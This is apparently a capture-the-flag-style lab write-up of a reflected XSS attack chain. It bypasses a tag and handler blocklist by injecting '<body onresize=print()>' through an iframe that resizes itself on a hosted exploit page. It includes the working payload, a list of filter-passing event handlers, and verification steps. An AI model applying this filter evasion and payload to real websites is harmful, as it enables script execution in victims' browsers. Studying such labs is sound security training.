# Attack Chain — WAF bypass via unlisted body+onresize, victim iframe-resized

## Data flow
```
Attacker stores on exploit server (/exploit):
    <iframe src="https://LAB/?search=%22%3E%3Cbody%20onresize=print()%3E"
            onload=this.style.width='100px'>
   │
   ▼
Victim visits https://exploit-server.net/exploit            [DELIVERY LEG]
   │  iframe loads LAB search URL
   ▼
LAB server echoes term VERBATIM (WAF passes: "body" not blocklisted,
"onresize" not blocklisted):  <h1>0 search results for '"><body onresize=print()>'</h1>
   │  (the ">" prefix renders as inert text; h1 needs no breakout)
   ▼
[SINK] victim parser meets second <body> token → body-attribute MERGE: onresize
(not present on real <body>) is COPIED onto document.body → reflects to window.onresize
   │
   ▼
[EVENT GATE] iframe onload fires → this.style.width='100px' RESIZES the iframe →
inner window viewport changes → resize event
   │
   ▼
[TRUST BOUNDARY CROSSED] window.onresize → print() in LAB origin, VICTIM context
   ▼
RESULT: print() with zero user interaction → platform detects → is-solved
```

## Why this pair (gap analysis summary)
- Tags: ~45 known tags probed → ALL 400 (case-insensitive, separator-tolerant:
  `<img/src=…>`, newlines, tabs all caught). Passes: `<body>` (any case), unknown/
  custom tags (`<xss>`, `<x>`, `<custom-tag>`) — the blocklist is a known-tag list.
- Handlers: common `on*` (load/error/focus/click/mouseover/…) all 400, including
  inside custom tags and with case/separator evasions. Passes (200): onpointercancel,
  ongotpointercapture, onlostpointercapture, onformdata, onsecuritypolicyviolation,
  onslotchange, oncancel, onstorage, onlanguagechange, onrejectionhandled — plus the
  separately-tested **onresize**.
- Of all passing handlers, ONLY `onresize` (window event, body-mergeable, triggered
  by programmatic iframe resize) yields ZERO-interaction execution — the lab's hard
  requirement. The rest need dead triggers (no CSP to violate, no storage writes, no
  pointer capture, slot/dialog/form-only targets, unload-suppressed dialogs).

## Expected response sequence (verified)
1. Oracle: `<body onresize=X>` → 200 (gap confirmed); `<img…>`/`<svg…>`/`<body onload…>` → 400.
2. CDP (title-marker variant): body carries `onresize`, `window.onresize` is function,
   dispatched `resize` sets title (merge→handler→event proven without victim).
3. STORE exploit (byte-verified via `GET /exploit`) → DELIVER (302) → access log shows
   `GET /exploit/ "Mozilla/5.0 (Victim)…Chrome/151…"` → banner `is-solved`.